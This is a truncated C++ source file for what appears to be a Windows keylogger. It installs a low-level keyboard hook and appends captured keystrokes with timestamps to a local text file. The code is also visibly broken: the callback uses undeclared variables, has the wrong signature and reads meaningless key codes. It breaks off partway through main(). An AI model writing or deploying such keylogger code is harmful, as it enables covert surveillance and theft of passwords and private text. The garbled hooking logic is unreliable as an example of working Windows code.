```cpp
#include <windows.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <string>
#include <sstream>

using namespace std;

void KeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    bool isKeyDown = (wParam == 0x0001); // 1 for key down, 0 for key up
    bool wasKeyDown = GetAsyncKeyState(0x0000);
    if (wasKeyDown != isKeyDown)
    {
        if (isKeyDown)
        {
            char key = GetKeyState(0x0000);
            char c = (key & 0x1FF) ? (key > 0 ? (key - 0x00) : 0) : '\0';
            if (key & 0x0080)
            {
                file << "Modifier: ";
            }
            file << c << " at ";
            std::time_t now = time(nullptr);
            stringstream timestamp;
            timestamp << now;
            file << timestamp << "\n";
            keystrokeCount++;
        }
    }
}

int main()
{
    HHOOK hook = 0;
    ofstream file("keystrokes.txt", ios::app);
    hook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardCallback);
    if (!hook)
    {
        cerr << "Failed to install keyboard hook" << endl;
        return 1;
